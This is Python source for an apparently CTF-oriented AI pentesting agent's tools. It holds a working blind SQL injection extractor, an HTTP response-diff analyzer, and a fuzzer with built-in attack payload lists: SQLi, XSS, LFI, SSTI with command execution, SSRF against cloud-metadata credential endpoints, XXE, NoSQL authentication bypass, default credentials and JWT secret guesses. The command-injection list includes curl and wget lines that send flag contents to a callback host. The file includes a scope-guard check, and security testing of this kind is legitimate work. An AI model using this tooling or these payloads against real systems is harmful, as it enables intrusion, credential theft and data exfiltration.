"""Deterministic execution tools for the ReAct pentesting agent.

Zero LLM cost — pure Python algorithmic loops:
- BlindSQLiExtractor: Binary search for blind SQL injection data extraction
- ResponseDiffAnalyzer: Systematic HTTP response comparison
- SystematicFuzzer: Wordlist-based enumeration and fuzzing
"""

from __future__ import annotations

import asyncio
import json
import re
import time
from typing import Any

import httpx
import structlog

from ai_brain.active.scope_guard import ActiveScopeGuard

logger = structlog.get_logger()


# ── Blind SQL Injection Extractor ─────────────────────────────────────


class BlindSQLiExtractor:
    """Binary search extraction for blind SQL injection — zero LLM cost.

    Extracts string data character-by-character using ~7 HTTP requests per char.
    Supports MySQL, PostgreSQL, MSSQL, and SQLite.
    """

    # DB-specific SQL functions
    _DB_FUNCTIONS = {
        "mysql": {"length": "LENGTH", "ascii": "ASCII", "substring": "SUBSTRING"},
        "postgres": {"length": "LENGTH", "ascii": "ASCII", "substring": "SUBSTRING"},
        "mssql": {"length": "LEN", "ascii": "ASCII", "substring": "SUBSTRING"},
        "sqlite": {"length": "LENGTH", "ascii": "UNICODE", "substring": "SUBSTR"},
    }

    def __init__(self, scope_guard: ActiveScopeGuard | None, timeout: int = 120,
                 socks_proxy: str | None = None):
        self._scope_guard = scope_guard
        self._timeout = timeout
        proxy_kwargs: dict[str, Any] = {}
        if socks_proxy:
            proxy_kwargs["proxy"] = socks_proxy
        self._client = httpx.AsyncClient(
            timeout=10, verify=False, follow_redirects=True, **proxy_kwargs,
        )
        self._request_count = 0

    async def extract(
        self,
        url: str,
        method: str,
        param: str,
        injection_template: str,
        true_condition: dict,
        db_type: str,
        target_query: str,
        max_chars: int = 64,
        **kwargs: Any,
    ) -> dict[str, Any]:
        """Extract string character-by-character via binary search.

        Args:
            url: Target URL.
            method: HTTP method (GET or POST).
            param: Vulnerable parameter name.
            injection_template: SQL template with {query}, {pos}, {mid} placeholders.
            true_condition: How to detect TRUE response.
                {type: "status_code"|"content_contains"|"content_length"|"time_delay", value: ...}
            db_type: Database type (mysql, postgres, mssql, sqlite).
            target_query: SQL query to extract data from.
            max_chars: Maximum characters to extract (default 64).

        Returns:
            {extracted, chars, requests, confidence, errors}
        """
        # Validate scope
        if self._scope_guard:
            self._scope_guard.validate_url(url)

        if db_type not in self._DB_FUNCTIONS:
            return {"error": f"Unsupported db_type: {db_type}. Use: {list(self._DB_FUNCTIONS)}"}

        self._request_count = 0
        errors: list[str] = []
        start_time = time.monotonic()

        # Parse other params from URL query string
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(url)
        other_params = {}
        if parsed.query:
            qs = parse_qs(parsed.query, keep_blank_values=True)
            for k, v in qs.items():
                if k != param:
                    other_params[k] = v[0] if len(v) == 1 else v
        base_url = url.split("?")[0] if "?" in url else url

        # Step 1: Validate the injection works with a known-true test
        try:
            true_payload = injection_template.format(query=target_query, pos="1", mid="0")
            true_resp = await self._send_request(base_url, method, param, true_payload, other_params)
            true_result = self._evaluate_condition(true_resp, true_condition)

            false_payload = injection_template.format(query=target_query, pos="1", mid="126")
            false_resp = await self._send_request(base_url, method, param, false_payload, other_params)
            false_result = self._evaluate_condition(false_resp, true_condition)

            if true_result == false_result:
                return {
                    "extracted": "",
                    "chars": 0,
                    "requests": self._request_count,
                    "confidence": 0.0,
                    "errors": ["Validation failed: true and false conditions produce same result. "
                               "Check injection_template and true_condition."],
                }
        except Exception as e:
            return {
                "extracted": "",
                "chars": 0,
                "requests": self._request_count,
                "confidence": 0.0,
                "errors": [f"Validation error: {e}"],
            }

        # Step 2: Extract character by character
        extracted = []
        for pos in range(1, max_chars + 1):
            if time.monotonic() - start_time > self._timeout:
                errors.append(f"Timeout after {self._timeout}s at position {pos}")
                break

            try:
                char_code = await self._binary_search_char(
                    base_url, method, param, injection_template,
                    true_condition, target_query, pos, other_params,
                )
            except Exception as e:
                errors.append(f"Error at pos {pos}: {e}")
                break

            if char_code is None or char_code == 0:
                # End of string
                break

            extracted.append(chr(char_code))
            logger.debug(
                "blind_sqli_char",
                pos=pos,
                char=chr(char_code),
                requests=self._request_count,
            )

        result_str = "".join(extracted)
        confidence = 0.95 if len(extracted) > 0 else 0.0

        return {
            "extracted": result_str,
            "chars": len(extracted),
            "requests": self._request_count,
            "confidence": confidence,
            "elapsed_seconds": round(time.monotonic() - start_time, 1),
            "errors": errors,
        }

    async def _binary_search_char(
        self,
        url: str,
        method: str,
        param: str,
        template: str,
        true_condition: dict,
        query: str,
        pos: int,
        other_params: dict,
    ) -> int | None:
        """Binary search for ASCII value at position pos (~7 requests)."""
        low, high = 32, 126

        while low <= high:
            mid = (low + high) // 2
            payload = template.format(query=query, pos=str(pos), mid=str(mid))
            resp = await self._send_request(url, method, param, payload, other_params)
            result = self._evaluate_condition(resp, true_condition)

            if result:
                # True: ASCII > mid
                low = mid + 1
            else:
                # False: ASCII <= mid
                high = mid - 1

        # low should be the ASCII value
        if low < 32 or low > 126:
            return None
        return low

    async def _send_request(
        self,
        url: str,
        method: str,
        param: str,
        payload: str,
        other_params: dict,
    ) -> httpx.Response:
        """Send a single HTTP request with the injection payload."""
        self._request_count += 1
        params = dict(other_params)
        params[param] = payload

        # Rate limit: 20ms between requests
        await asyncio.sleep(0.02)

        if method.upper() == "GET":
            return await self._client.get(url, params=params)
        else:
            return await self._client.post(url, data=params)

    def _evaluate_condition(self, response: httpx.Response, true_condition: dict) -> bool:
        """Evaluate whether the response matches the TRUE condition."""
        cond_type = true_condition.get("type", "")
        cond_value = true_condition.get("value")

        if cond_type == "status_code":
            return response.status_code == int(cond_value)
        elif cond_type == "content_contains":
            return str(cond_value) in response.text
        elif cond_type == "content_length":
            # True if response length is close to expected
            expected = int(cond_value)
            actual = len(response.content)
            return abs(actual - expected) < max(50, expected * 0.1)
        elif cond_type == "time_delay":
            # True if response was slow (time-based blind)
            delay = float(cond_value)
            return response.elapsed.total_seconds() >= delay * 0.8
        else:
            logger.warning("unknown_condition_type", type=cond_type)
            return False

    async def close(self) -> None:
        """Close the HTTP client."""
        await self._client.aclose()


# ── Response Diff Analyzer ────────────────────────────────────────────


class ResponseDiffAnalyzer:
    """Systematic HTTP response comparison — zero LLM cost.

    Compares test requests against a baseline to detect blind injection points,
    WAF behavior, and filter rules. Classifies each response as:
    WAF_BLOCKED, SANITIZED, APP_ERROR, PASSED, or INCONCLUSIVE.
    """

    _WAF_SIGNATURES = [
        "access denied", "forbidden", "blocked", "not acceptable",
        "mod_security", "cloudflare", "akamai", "incapsula",
        "request blocked", "waf", "security violation",
    ]

    _ERROR_KEYWORDS = [
        "error", "exception", "traceback", "fatal", "syntax error",
        "undefined", "null reference", "stack trace",
    ]

    def __init__(self, scope_guard: ActiveScopeGuard | None, timeout: int = 30,
                 socks_proxy: str | None = None):
        self._scope_guard = scope_guard
        self._timeout = timeout
        self._socks_proxy = socks_proxy

    async def analyze(
        self,
        base_request: dict,
        test_requests: list[dict],
        baseline_samples: int = 3,
        **kwargs: Any,
    ) -> dict[str, Any]:
        """Compare test requests against baseline.

        Args:
            base_request: {url, method, headers, body, params}
            test_requests: [{label, ...overrides to base}]
            baseline_samples: Number of baseline repetitions (default 3).

        Returns:
            {baseline: {avg_status, avg_length, avg_time_ms, variance},
             results: [{label, status, length, time_ms, classification, diff_details}]}
        """
        url = base_request.get("url", "")
        if self._scope_guard:
            self._scope_guard.validate_url(url)

        method = base_request.get("method", "GET").upper()
        headers = base_request.get("headers", {})
        body = base_request.get("body")
        params = base_request.get("params", {})

        proxy_kwargs: dict[str, Any] = {}
        if self._socks_proxy:
            proxy_kwargs["proxy"] = self._socks_proxy
        async with httpx.AsyncClient(
            verify=False, timeout=self._timeout, follow_redirects=True, **proxy_kwargs,
        ) as client:
            # Helper: send request with proper body handling (dict=form, str=raw/JSON)
            async def _send(m: str, u: str, h: dict, b: Any, p: dict) -> httpx.Response:
                kwargs: dict[str, Any] = {"headers": dict(h)}  # copy to avoid mutation
                if isinstance(b, dict):
                    kwargs["data"] = b  # form-encoded
                elif b is not None:
                    # Detect JSON strings and set Content-Type header
                    if isinstance(b, str):
                        try:
                            json.loads(b)
                            # Valid JSON -- set content-type if not already set
                            has_ct = any(
                                k.lower() == "content-type" for k in kwargs["headers"]
                            )
                            if not has_ct:
                                kwargs["headers"]["Content-Type"] = "application/json"
                        except (json.JSONDecodeError, ValueError):
                            pass  # Not JSON, send as raw
                    kwargs["content"] = b  # raw string/bytes
                if p:
                    kwargs["params"] = p
                return await client.request(m, u, **kwargs)

            # Step 1: Establish baseline
            baseline_data = []
            for _ in range(baseline_samples):
                await asyncio.sleep(0.05)
                start = time.monotonic()
                try:
                    resp = await _send(method, url, headers, body, params)
                    elapsed_ms = int((time.monotonic() - start) * 1000)
                    baseline_data.append({
                        "status": resp.status_code,
                        "length": len(resp.content),
                        "time_ms": elapsed_ms,
                        "body_sample": resp.text[:500],
                    })
                except Exception as e:
                    baseline_data.append({"error": str(e)})

            # Compute baseline stats
            valid_baselines = [b for b in baseline_data if "error" not in b]
            if not valid_baselines:
                return {
                    "baseline": {"error": "All baseline requests failed"},
                    "results": [],
                }

            avg_status = valid_baselines[0]["status"]
            avg_length = sum(b["length"] for b in valid_baselines) // len(valid_baselines)
            avg_time = sum(b["time_ms"] for b in valid_baselines) // len(valid_baselines)
            length_variance = max(
                abs(b["length"] - avg_length) for b in valid_baselines
            ) if len(valid_baselines) > 1 else 0

            baseline = {
                "avg_status": avg_status,
                "avg_length": avg_length,
                "avg_time_ms": avg_time,
                "length_variance": length_variance,
                "samples": len(valid_baselines),
            }
            baseline_body = valid_baselines[0].get("body_sample", "")

            # Step 2: Send test requests and classify
            results = []
            for test in test_requests:
                label = test.get("label", "unnamed")
                test_url = test.get("url", url)
                test_method = test.get("method", method)
                test_headers = {**headers, **test.get("headers", {})}
                test_body = test.get("body", body)
                test_params = {**params, **test.get("params", {})}

                if self._scope_guard:
                    try:
                        self._scope_guard.validate_url(test_url)
                    except Exception:
                        results.append({
                            "label": label,
                            "error": "URL out of scope",
                            "classification": "SKIPPED",
                        })
                        continue

                await asyncio.sleep(0.05)
                start = time.monotonic()
                try:
                    resp = await _send(
                        test_method, test_url, test_headers, test_body, test_params,
                    )
                    elapsed_ms = int((time.monotonic() - start) * 1000)
                except Exception as e:
                    results.append({
                        "label": label,
                        "error": str(e),
                        "classification": "INCONCLUSIVE",
                    })
                    continue

                # Classify
                classification, diff_details = self._classify_response(
                    resp, avg_status, avg_length, length_variance,
                    avg_time, baseline_body,
                )

                results.append({
                    "label": label,
                    "status": resp.status_code,
                    "length": len(resp.content),
                    "time_ms": elapsed_ms,
                    "classification": classification,
                    "diff_details": diff_details,
                })

        return {"baseline": baseline, "results": results}

    def _classify_response(
        self,
        resp: httpx.Response,
        baseline_status: int,
        baseline_length: int,
        length_variance: int,
        baseline_time: int,
        baseline_body: str,
    ) -> tuple[str, str]:
        """Classify a response against the baseline."""
        body_lower = resp.text[:2000].lower()

        # WAF blocked: 403/406/429 or WAF signatures
        if resp.status_code in (403, 406, 429):
            return "WAF_BLOCKED", f"Status {resp.status_code} (baseline: {baseline_status})"
        for sig in self._WAF_SIGNATURES:
            if sig in body_lower and sig not in baseline_body.lower():
                return "WAF_BLOCKED", f"WAF signature detected: '{sig}'"

        # App error: 500 or error keywords not in baseline
        if resp.status_code >= 500:
            return "APP_ERROR", f"Status {resp.status_code}"
        for kw in self._ERROR_KEYWORDS:
            if kw in body_lower and kw not in baseline_body.lower():
                return "APP_ERROR", f"Error keyword: '{kw}'"

        # Sanitized: response similar but payload stripped
        length_diff = abs(len(resp.content) - baseline_length)
        tolerance = max(100, length_variance * 3)
        if resp.status_code == baseline_status and length_diff < tolerance:
            return "PASSED", f"Status and length match baseline (diff: {length_diff})"

        # Significant length difference
        if length_diff > tolerance:
            return "INCONCLUSIVE", (
                f"Length differs significantly: {len(resp.content)} vs baseline {baseline_length} "
                f"(diff: {length_diff}, tolerance: {tolerance})"
            )

        return "PASSED", "Response matches baseline"


# ── Systematic Fuzzer ─────────────────────────────────────────────────


class SystematicFuzzer:
    """Wordlist-based enumeration — zero LLM cost.

    Fuzzes URLs or request bodies using built-in or custom wordlists.
    Filters results by status code, content, or response length.
    """

    BUILTIN_WORDLISTS: dict[str, list[str]] = {
        "common-dirs": [
            "admin", "administrator", "api", "app", "assets", "auth", "backup",
            "bin", "blog", "cache", "cgi-bin", "config", "console", "content",
            "css", "dashboard", "data", "database", "db", "debug", "dev",
            "docs", "download", "downloads", "editor", "email", "env", "error",
            "export", "feed", "file", "files", "font", "fonts", "graphql",
            "health", "help", "home", "html", "image", "images", "img",
            "import", "include", "includes", "index", "info", "internal",
            "js", "json", "lib", "log", "login", "logout", "logs", "mail",
            "manage", "manager", "media", "misc", "module", "modules",
            "monitor", "new", "node_modules", "old", "page", "pages", "panel",
            "php", "phpinfo", "phpmyadmin", "ping", "plugin", "plugins",
            "portal", "post", "posts", "private", "profile", "public",
            "redirect", "register", "report", "reports", "reset", "resource",
            "resources", "rest", "root", "rss", "script", "scripts", "search",
            "secret", "secure", "security", "server", "service", "services",
            "settings", "setup", "shop", "signin", "signup", "sitemap",
            "sql", "src", "staging", "static", "stats", "status", "storage",
            "store", "style", "styles", "swagger", "sys", "system", "tag",
            "tags", "temp", "template", "templates", "test", "testing",
            "theme", "themes", "tmp", "token", "tool", "tools", "trace",
            "track", "upload", "uploads", "user", "users", "v1", "v2", "v3",
            "vendor", "version", "web", "webmail", "widget", "widgets",
            "wiki", "wp-admin", "wp-content", "wp-includes", "wp-login",
            "xml", "xmlrpc",
        ],
        "common-files": [
            ".env", ".git/config", ".git/HEAD", ".gitignore", ".htaccess",
            ".htpasswd", ".svn/entries", ".well-known/security.txt",
            "CHANGELOG.md", "CONTRIBUTING.md", "Dockerfile", "Gruntfile.js",
            "LICENSE", "Makefile", "README.md", "Rakefile", "SECURITY.md",
            "Vagrantfile", "bower.json", "composer.json", "composer.lock",
            "config.php", "config.yml", "config.xml", "configuration.php",
            "crossdomain.xml", "database.yml", "debug.log", "docker-compose.yml",
            "error.log", "favicon.ico", "gulpfile.js", "humans.txt",
            "info.php", "install.php", "package-lock.json", "package.json",
            "phpinfo.php", "robots.txt", "server-status", "server-info",
            "settings.py", "sitemap.xml", "web.config", "webpack.config.js",
            "wp-config.php", "wp-config.php.bak", "yarn.lock",
        ],
        "sqli-payloads": [
            "'", "''", "\"", "' OR '1'='1", "' OR '1'='1'--",
            "' OR 1=1--", "\" OR 1=1--", "' OR 'a'='a", "') OR ('1'='1",
            "1' ORDER BY 1--", "1' ORDER BY 10--", "1' UNION SELECT NULL--",
            "1' UNION SELECT NULL,NULL--", "1' UNION SELECT NULL,NULL,NULL--",
            "' AND 1=1--", "' AND 1=2--", "' AND SLEEP(3)--",
            "'; WAITFOR DELAY '0:0:3'--", "' AND (SELECT 1)=1--",
            "1; DROP TABLE test--", "admin'--", "1' AND '1'='1",
            "1' AND '1'='2", "' HAVING 1=1--", "' GROUP BY 1--",
            "'; SELECT pg_sleep(3)--", "1)) OR 1=1--",
            "')) OR (('1'='1", "' OR ''='", "admin' #", "admin'/*",
            "' || '1'='1", "' && '1'='1", "1 OR 1=1", "1' OR '1'='1' #",
            "' UNION ALL SELECT NULL--", "SLEEP(3)#", "1 AND SLEEP(3)",
            "' BENCHMARK(10000000,SHA1('test'))--",
            "';DECLARE @v VARCHAR(8000);SET @v='test';--",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--",
            "0xBE", "' LIKE '%", "1' AND 1=CONVERT(int,@@version)--",
            "1 UNION SELECT @@version--", "' OR username LIKE '%",
            "' AND ASCII(SUBSTRING(version(),1,1))>50--",
        ],
        "xss-payloads": [
            "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>", "<body onload=alert(1)>",
            "javascript:alert(1)", "\"><script>alert(1)</script>",
            "'><script>alert(1)</script>", "<img/src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>", "<details/open/ontoggle=alert(1)>",
            "<math><mi>x</mi><annotation-xml encoding=\"text/html\"><svg onload=alert(1)>",
            "<iframe src=javascript:alert(1)>", "'-alert(1)-'",
            "\"-alert(1)-\"", "<xss onafterscriptexecute=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<select onfocus=alert(1) autofocus>",
            "<textarea onfocus=alert(1) autofocus>",
            "<keygen onfocus=alert(1) autofocus>",
            "<video><source onerror=alert(1)>",
            "<audio src=x onerror=alert(1)>",
            "<marquee onstart=alert(1)>",
            "<isindex type=image src=1 onerror=alert(1)>",
            "<<script>alert(1)//<</script>",
            "<img src=\"x`onmo`useover=alert(1)\">",
            "<svg><script>alert(1)</script></svg>",
            "<a href=\"javascript:alert(1)\">click</a>",
            "\"><img src=x onerror=alert(1)>",
            "'><img src=x onerror=alert(1)>",
            "<ScRiPt>alert(1)</ScRiPt>",
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "&#60;script&#62;alert(1)&#60;/script&#62;",
            "<IMG SRC=JaVaScRiPt:alert(1)>",
            "<img src=x:alert(1) onerror=eval(src)>",
            "};alert(1);//", "*/alert(1)/*",
            "${alert(1)}", "{{constructor.constructor('alert(1)')()}}",
            "<div style=\"width:expression(alert(1))\">",
            "<link rel=import href=\"data:text/html,<script>alert(1)</script>\">",
            "<base href=javascript:alert(1)///>",
        ],
        "lfi-payloads": [
            "../../../etc/passwd", "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "....\\/....\\/....\\/etc/passwd",
            "../../../etc/shadow", "../../../etc/hosts",
            "../../../proc/self/environ", "../../../proc/self/cmdline",
            "../../../var/log/apache2/access.log",
            "../../../var/log/nginx/access.log",
            "..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "/etc/passwd", "file:///etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/read=string.rot13/resource=index.php",
            "php://input", "expect://id", "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
            "phar://test.phar/test.txt",
            "/proc/self/fd/0", "/proc/self/fd/1", "/proc/self/fd/2",
            "/dev/null", "/dev/random", "/dev/urandom",
            "....//....//....//....//etc/passwd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd",
            "..%00/..%00/..%00/etc/passwd", "..%0d/..%0d/..%0d/etc/passwd",
            "../../../etc/passwd%00.jpg", "../../../etc/passwd%00.html",
            "....//....//....//windows/win.ini",
            "../../../boot.ini", "C:\\boot.ini",
            "\\\\localhost\\c$\\windows\\win.ini",
            "file:///c:/windows/win.ini",
            "..;/..;/..;/etc/passwd",
            "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\/etc/passwd",
        ],
        "default-credentials": [
            "admin:admin", "admin:password", "admin:admin123", "admin:123456",
            "admin:12345678", "admin:admin1234", "admin:root", "admin:toor",
            "admin:letmein", "admin:welcome", "admin:master", "admin:dragon",
            "admin:login", "admin:abc123", "admin:qwerty", "admin:passw0rd",
            "admin:Password1", "admin:admin@123", "admin:administrator",
            "admin:changeme", "admin:secret", "admin:password1",
            "root:root", "root:toor", "root:password", "root:admin",
            "test:test", "test:test123", "test:password",
            "user:user", "user:password", "user:user123",
            "guest:guest", "guest:password",
            "demo:demo", "demo:password", "operator:operator",
            "manager:manager", "support:support",
            "administrator:administrator", "administrator:password",
            "admin:Password123", "admin:P@ssw0rd", "admin:Admin123",
            "admin:default", "admin:pass", "admin:1234",
        ],
        "jwt-secrets": [
            "secret", "password", "123456", "admin", "key",
            "jwt_secret", "jwt-secret", "changeme", "test", "default",
            "super_secret", "s3cr3t", "mysecret", "secretkey", "secret_key",
            "jwt", "token", "auth", "app_secret", "application_secret",
            "hmac_secret", "signing_key", "private_key", "api_key", "apikey",
            "passphrase", "pass", "letmein", "welcome", "monkey",
            "master", "dragon", "qwerty", "login", "1234567890",
            "abc123", "password1", "iloveyou", "sunshine", "princess",
            "football", "charlie", "access", "hello", "shadow",
            "michael", "trustno1", "baseball", "whatever", "freedom",
            "654321", "jordan", "superman", "qazwsx", "ninja",
            "azerty", "solo", "loveme", "starwars", "master123",
            "zaq1@WSX", "P@ssw0rd", "p@ssword", "hunter2", "god",
            "mypassword", "the_secret", "top_secret", "topsecret",
            "supersecret", "1q2w3e4r", "qwerty123", "password123",
            "abc12345", "12345678", "1234", "12345", "123456789",
            "1111", "0000", "root", "toor", "pass123",
            "gfhjkm", "159753", "999999", "qwert", "zxcvbn",
            "HS256_default", "RS256_key", "HMAC_KEY", "JWT_KEY",
            "node_secret", "express_secret", "django_secret", "rails_secret",
            "flask_secret", "laravel_key", "spring_secret", "dotnet_secret",
        ],
        "ssti-payloads": [
            # Polyglot detection probe
            "${{<%[%'\"}}%\\",
            # Jinja2 / Twig / Nunjucks
            "{{7*7}}", "{{7*'7'}}", "{{config}}", "{{self.__class__}}", "{{''.__class__.__mro__}}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            # Mako / EL
            "${7*7}", "${self.module.__loader__}", "${T(java.lang.Runtime).getRuntime().exec('id')}",
            # ERB
            "<%= 7*7 %>", "<%= system('id') %>", "<%= `id` %>",
            # Pebble / Slim
            "#{7*7}", "#{T(java.lang.Runtime).getRuntime().exec('id')}",
            # Razor
            "@(7*7)", "@(1+2)",
            # Freemarker
            "<#assign x=7*7>${x}", "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
            # Velocity
            "#set($x=7*7)$x", "#set($e=\"\")$e.class.forName(\"java.lang.Runtime\")",
            # Smarty (PHP)
            "{php}echo 7*7;{/php}", "{system('id')}",
            # Django
            "{% debug %}", "{{settings.SECRET_KEY}}",
        ],
        "ssrf-payloads": [
            # Localhost variants
            "http://127.0.0.1", "http://localhost", "http://[::1]",
            "http://0.0.0.0", "http://0177.0.0.1", "http://0x7f000001",
            "http://2130706433", "http://127.1", "http://127.0.1",
            # Cloud metadata endpoints
            "http://169.254.169.254/latest/meta-data/", "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/metadata/v1/",
            # Internal services
            "http://127.0.0.1:8080", "http://127.0.0.1:3000", "http://127.0.0.1:8443",
            "http://127.0.0.1:9090", "http://127.0.0.1:5000", "http://127.0.0.1:6379",
            # Protocol schemes
            "file:///etc/passwd", "file:///etc/hosts", "file:///proc/self/environ",
            "gopher://127.0.0.1:25/", "dict://127.0.0.1:11211/stat",
            # Bypass techniques
            "http://127.0.0.1.nip.io", "http://spoofed.burpcollaborator.net",
            "http://127.0.0.1%2509", "http://0x7f.0x0.0x0.0x1",
        ],
        "cmdi-payloads": [
            # Output-based (when reflected)
            "; id", "| id", "|| id", "& id", "&& id", "$(id)", "`id`",
            "; cat /etc/passwd", "| cat /etc/passwd",
            "; cat /FLAG*", "| cat /FLAG*", "$(cat /FLAG*)",
            "; ls -la /", "| ls /",
            # Blind time-based
            "; sleep 5", "| sleep 5", "|| sleep 5", "& sleep 5",
            "&& sleep 5", "$(sleep 5)", "`sleep 5`",
            "; sleep 5 #", "| sleep 5 #",
            # Blind file-based exfiltration
            "; cat /FLAG* > /var/www/html/out.txt",
            "; cp /FLAG* /var/www/html/flag_output.txt",
            "; cat /FLAG* > /tmp/out.txt",
            # Blind OOB (curl/wget)
            "; curl http://{CALLBACK}/$(cat /FLAG* | base64)",
            "; wget http://{CALLBACK}/$(cat /FLAG* | base64)",
            # Filter bypass variants
            ";${IFS}id", "|${IFS}id", ";${IFS}cat${IFS}/etc/passwd",
            ";\tcat\t/etc/passwd", ";{cat,/etc/passwd}",
            "$(cat${IFS}/FLAG*)", "$(cat<>/FLAG*)",
            # Newline-based
            "%0aid", "%0acat /FLAG*", "%0d%0aid",
            # Windows
            "& type C:\\FLAG*", "| type C:\\FLAG*",
            "& ping -n 5 127.0.0.1", "| timeout /t 5",
        ],
        "flag-files": [
            # Common CTF flag locations
            "/FLAG", "/FLAG.txt", "/FLAG.php", "/flag", "/flag.txt", "/flag.php",
            "/root/FLAG", "/root/FLAG.txt", "/root/flag.txt",
            "/home/FLAG", "/home/flag.txt",
            "/tmp/FLAG", "/tmp/flag.txt",
            "/var/www/FLAG", "/var/www/flag.txt",
            "/var/www/html/FLAG", "/var/www/html/flag.txt",
            "/opt/FLAG", "/opt/flag.txt",
            "/app/FLAG", "/app/flag.txt",
            "FLAG", "FLAG.txt", "FLAG.php", "flag", "flag.txt", "flag.php",
            "../FLAG", "../FLAG.txt", "../FLAG.php", "../flag.txt", "../flag.php",
            "../../FLAG", "../../FLAG.txt", "../../FLAG.php", "../../flag.txt", "../../flag.php",
            "../../../FLAG", "../../../FLAG.txt", "../../../FLAG.php", "../../../flag.txt",
            "../../../../FLAG", "../../../../FLAG.php", "../../../../flag.txt",
            "../../../../../FLAG", "../../../../../FLAG.php", "../../../../../flag.txt",
            "../../../../../../FLAG", "../../../../../../FLAG.php",
            "../../../../../../../FLAG", "../../../../../../../FLAG.php",
            "../../../../../../../../FLAG", "../../../../../../../../FLAG.php",
            # PHP wrapper variants
            "php://filter/convert.base64-encode/resource=/FLAG",
            "php://filter/convert.base64-encode/resource=/FLAG.php",
            "php://filter/convert.base64-encode/resource=FLAG",
            "php://filter/convert.base64-encode/resource=FLAG.php",
            # Encoding variants
            "..%2FFLAG", "..%2F..%2FFLAG", "..%2F..%2F..%2FFLAG",
            "%2e%2e%2fFLAG", "%2e%2e%2f%2e%2e%2fFLAG",
            "....//FLAG", "....//....//FLAG", "....//....//....//FLAG",
        ],
        "nosqli-payloads": [
            # Operator injection (PHP/Node.js array parsing)
            '{"$ne": "x"}', '{"$gt": ""}', '{"$regex": ".*"}',
            '{"$exists": true}', '{"$in": ["admin"]}',
            "[$ne]=x", "[$gt]=", "[$regex]=.*", "[$exists]=true",
            "[$in][]=admin", "[$nin][]=x",
            # Auth bypass pairs (username + password)
            "username[$ne]=x&password[$ne]=x",
            "username=admin&password[$ne]=x",
            "username=admin&password[$regex]=.*",
            "username[$regex]=^admin&password[$ne]=x",
            "username[$gt]=&password[$gt]=",
            # JavaScript injection ($where)
            "' || 1==1//", "'; return true//",
            "1; return true", "'; sleep(5000)//",
            "this.password.match(/.*/)//",
            # JSON body payloads
            '{"username": "admin", "password": {"$ne": ""}}',
            '{"username": "admin", "password": {"$gt": ""}}',
            '{"username": "admin", "password": {"$regex": ".*"}}',
            '{"username": {"$ne": ""}, "password": {"$ne": ""}}',
            '{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}',
        ],
        "xxe-payloads": [
            # Basic XXE file read
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///FLAG">]><root>&xxe;</root>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///FLAG.txt">]><root>&xxe;</root>',
            # Parameter entity (for blind XXE)
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><root>test</root>',
            # XInclude (when DOCTYPE not allowed)
            '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
            '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///FLAG"/></foo>',
            # SVG XXE
            '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>',
            # SSRF via XXE
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1">]><root>&xxe;</root>',
            # PHP expect wrapper
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><root>&xxe;</root>',
            # Encoding bypass
            '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        ],
        "403-bypass-paths": [
            # Path normalization tricks (use with base path)
            "/./", "//", "/.//", "/..;/", "/%2e/", "/%2e%2e/", "/%252e/",
            "%2f", "%2F", "%2e%2e%2f", "%252e%252e%252f",
            # Trailing characters
            "/", "//", ".", "..", ";", "%23", "?", ".json", ".html", ".css", ".js",
            "%00", "%0a", "%0d", "%09", "%20",
            # Case variations (appended to path)
            # Verb override headers (tested as headers, not paths)
            # URL encoding variants
            "%2e%2e/", "..%2f", "..;/", "..\\/",
            # Double encoding
            "%252e%252e/", "%252e%252e%252f",
            # Nginx specific
            "..;/", "/..;/..;/",
            # Spring Boot specific
            ";/", ";foo/", ";.css",
            # Unicode/overlong encoding
            "..%c0%af", "..%ef%bc%8f", "..%c1%9c",
            # Null byte + extension
            "%00.jpg", "%00.html", "%00.css",
            # Hop-by-hop header abuse (tested via headers)
            # Various path constructions
